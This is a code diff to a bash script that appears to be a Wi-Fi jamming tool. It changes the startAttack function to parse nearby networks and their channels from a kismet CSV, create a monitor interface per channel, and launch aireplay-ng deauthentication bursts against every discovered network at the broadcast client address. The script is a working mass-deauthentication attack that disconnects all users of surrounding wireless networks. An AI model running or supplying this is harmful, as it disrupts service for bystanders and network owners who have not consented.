@@ -38,7 +38,6 @@ print_title_message (){
 trap ctrl_c INT
 ctrl_c () {
   for xterm in "${xterms_PID[@]}"; do
-    echo $xterm
     kill -9 $xterm 1>&1 2>/dev/null
   done
   resetInterface
@@ -87,22 +86,39 @@ startAttack () {
   a_ng_PID=$!
   sleep 5
   kill -9 $a_ng_PID >/dev/null && clear && ready_m "Networks Saved\n" 1>&2 2 # TODO: no verbose output
-  bssid_list=($(awk -F '[, ]' '/:/ && !/Station/ {print $1}' temp-01.csv))
+  bssid_list=($(awk -F ';' '/:/ && !/Network/ {print $4}' temp-01.kismet.csv))
+  bssid_ch_list=($(awk -F ';' '/:/ && !/Network/ {print $6}' temp-01.kismet.csv))
   rm temp*
 
   pos=0
   xterms_PID=()
+  channels=()
   for bssid in "${bssid_list[@]}"; do 
+    channel="${bssid_ch_list[$pos]}"
+    channels+=("$channel ")
     working_m $bssid
+    
+    iw dev "$interface" interface add "mon$channel" type monitor >/dev/null
+    ifconfig "mon$channel" up
+    iwconfig "mon$channel" channel "$channel"
+
     x=$((pos*50))
     y=$((pos*25))
-    xterm -fg red -bg black -hold -geometry 90x32+$x+$y -e "aireplay-ng -0 10 -c FF:FF:FF:FF:FF:FF -e $bssid $interface\
-      && ready_m Done! &" &
+    xterm -fg red -bg black -hold -geometry 90x32+$x+$y -e "aireplay-ng -0 10 -c FF:FF:FF:FF:FF:FF -a $bssid 'mon$channel' \
+      && echo 'Done!' &" &
     xterms_PID+="$! "
     pos=$((pos+1))
   done
-	
-    sleep 10
+
+  # TODO: Deleting channel interfaces
+  #for ch in "${channels[@]}"; do
+  # ifconfig "mon$ch" down && iw dev "mon$ch" del
+  # ready_m "mon$ch"
+  #one
+
+  # resetNet -i $interface
+
+  sleep 20
 }
 
 setMonitorMode () {
